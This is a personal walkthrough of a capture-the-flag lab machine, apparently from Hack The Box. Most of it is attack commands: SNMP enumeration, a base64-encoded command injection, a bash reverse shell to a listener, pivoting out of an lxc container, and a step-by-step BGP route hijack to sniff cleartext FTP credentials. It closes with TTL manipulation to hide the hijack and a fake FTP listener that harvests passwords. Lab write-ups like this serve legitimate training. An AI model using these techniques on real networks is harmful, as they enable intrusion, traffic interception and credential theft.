
### nmap -sT -p 1-65535 10.10.10.105
### nmap -sU -AO -p 1-65535 10.10.10.105

TCP:
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login

UDP:
PORT    STATE         SERVICE
67/udp  open|filtered dhcps
161/udp open          snmp

### nmap -sU -p 161 -sV 10.10.10.105

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; pysnmp SNMPv3 server (public)

### snmpwalk -c public -v 1 10.10.10.105

Created directory: /var/lib/snmp/mib_indexes
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
End of MIB

### gobuster -u http://10.10.10.105 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 40

in /doc found diagram and error codes.

loged in using admin and serial number : admin:NET_45JDX23

in Diagnostics found strange things;
checked using Burp, found a value encoded with base64; after decoding it happens to be "quagga" which I can find on the site after clicking a button.
Tryed exploit to RCE.
### quagga; ping 10.10.14.71; ps quagga    encoded this string in base64
### tcpdump -i tun0 icmp                   on my computer
### entered encoded value to check parameter using burp. Got it

### root;bash -i >& /dev/tcp/10.10.14.71/4444 0>&1
Got user
### cat /proc/1/environ          -> because we are root, had to check if we are in a container
we are in lxc container
### python3 -c 'import pty; pty.spawn("/bin/bash");'
### Ctrl+Z
### stty raw -echo
### fg
### export TERM=xterm-256color
### clear




### netstat -alnp | grep LIST
no http service. This is odd
### cat /etc/lsb-release                ensure the type of OS
### ssh-keyscan localhost               ensure the right keys for SSH
### Ctrl+Z
### ssh-keyscan 10.10.10.105            ensure the right keys for SSH
keys are different
### arp -an                             says with who the box is talking
After reading tickets, we know that a very important FTP server is on 10.120.15.10
there is no 10.120.15.0/24 network on arp -an list
trying to ping that network
### ping 10.120.15.1                    everything is ok. 10.120.15.1 is a gateway
Now we'll install nmap on the box.
create a binary version of nmap
then supply it through SimpleHTTPServer
then scan network
### chmod +x ./nmap
### ./nmap -p 21 10.120.15.0/24
10.120.15.10 FTP is opened
check the version of FTP
### nc 10.120.15.10 21
ftp version vsFTPd 3.0.3                not vulnerable
### netstat -alnp | grep LIST           found a bunch of bgp services
### crontab -l                          look on running scripts. found one
### cat /opt/restore.sh
### cat /etc/quagga/zebra.conf          looks like a cisco config file
### cat /etc/quagga/bgpd.conf           BGP config file with BGP commands
### vtysh
BGP hijacking
looking on a photo in /doc directory on a web-server and looking on bgp commands we
can figure out in which network we are.
### show running-config
### show ip route 10.120.15.10
found out that we have to go through 10.78.11.2 in order to get to FTP server
### sh ip bgp summary
lookup asn number                 using ipinfo.io asn lookup
### sh ip bgp                     shows all routes
### sh ip bgp 10.120.150.0/24     show info on advertisements
### sh ip bgp neighbors 10.78.10.2 advertised-routes

beginning hijacking
### mv /opt/restore.sh /opt/restore2.sh
### vtysh
### configure terminal            enter a config mode
### do sh run 
### router bgp 100                enter a config-router mode
### network 10.120.15.0/25        advertise more specific route for 10.120.15.10
### exit
### exit
### clear ip bgp * out
### sh ip bgp 10.120.15.0/25
### sh ip bgp neighbors 10.78.10.2 advertised-routes     shows that we are a prefered route to 10.120.15.0/25.
### cd ~
### tcpdump -i any -w ftp-1.cap port 21
### Ctrl^Z
### base64 ftp-1.cap              copy it and analyse it using wireshark on your computer
### vim ftp-1.cap.b64             paster encoded data
### base64 -d ftp-1.cap.b64 > ftp-1.cap
### wireshark
Got packets. 10.78.10.* sends SYN packets through us, but the handshake is never completed
in terminal:
### vtysh
### sh ip bgp neighbors 10.78.11.2 advertised-routes   10.78.10.2 sends packets to us, then we send them to 10.78.11.2 and they send a packet not to a destination, but to us back.
### exit
### nohup tcpdump -i any -w icmp.cap &
### ping -c 1 10.120.15.10                    it'll timeout
### pkill tcpump
### ps -ef | grep tcpdump
### kill process_id
### base64 icmp.cap                           it's very big
### nohup tcpdump -i any -w icmp.cap not port 22
### ping -c 1 10.120.15.10
### ps -ef | grep tcpdump
### kill process_id
### base64 icmp.cap
save it on my PC and run
### wireshark
we have to destroy a route from us to 10.78.11.2
### vtysh
### conf t
### do sh run
block for as300
### ip prefix-list PrefixList permit 10.120.15.0/25
### route-map to-as300 deny 5
### match ip address prefix-list PrefixList
### exit
### end
### clear ip bgp * out
### ping 10.120.15.10
GET TRAFIC DUMP again
analyse it with
### wireshark
### vtysh
### conf t
### route-map to-as200 permit 5
### match ip address prefix-list PrefixList
### set community no-export
### end
### ping 10.120.15.10                              works
GET TRAFIC DUMP again
### nohup tcpdump -i any -w ftp2.cap port 21
analyse it with
### base64 ftp2.cap
### wireshark
follow a tcp stream
find credentials

TCP STREAM
#################################################################
220 (vsFTPd 3.0.3)
USER root                                                        user
331 Please specify the password.
PASS BGPtelc0rout1ng                                             pass
230 Login successful.
SYST
215 UNIX Type: L8
TYPE I
200 Switching to Binary mode.
PASV
227 Entering Passive Mode (10,120,15,10,154,29).
STOR secretdata.txt
150 Ok to send data.
226 Transfer complete.
QUIT
221 Goodbye.
##################################################################

1 varient:
	using ftp pass mode (pass command)
2 varient:
	wget -m ftp://root:BGPtelc0rout1ng@10.120.15.10

got root.txt and secretdata.txt

for fun:

ssh to 10.10.10.105
### lxc list
launch 3 terminals

### lxc exec -- INTERFACE_NAME bash
### iptables -t mangle -A PREROUTING -i eth1 -j TTL --ttl-inc 1
this makes your invisible if u do this on all interfaces.
P.S. there might be other techniques to detect bgp hijacking	

The second way to get user and pass. route all trafic to our router. Then type these commands
### ifconfig eth2 10.120.15.10 netmask 255.255.255.128
### nc -lvnp 21
after receiving a connection and receiving USER root
reply 331 in next line, then u'll get a password.
